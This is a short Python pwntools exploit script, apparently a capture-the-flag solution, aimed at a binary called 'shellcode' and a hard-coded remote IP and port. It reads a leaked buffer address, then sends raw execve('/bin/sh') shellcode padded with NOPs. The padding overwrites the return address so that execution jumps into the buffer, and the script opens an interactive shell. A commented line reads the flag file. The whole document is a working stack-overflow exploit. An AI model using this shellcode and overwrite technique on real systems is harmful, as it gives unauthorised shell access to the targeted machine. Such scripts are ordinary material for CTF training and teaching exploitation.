#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './shellcode'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2119

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

r.recvuntil('Your address of input buffer is ')
buf_addr = r.recvline()[:-1]
buf_addr = int(buf_addr, 16)
log.info( 'buf_addr = ' + hex(buf_addr))
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline(sc.ljust(0x78, b'\x90') + p64(buf_addr))
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
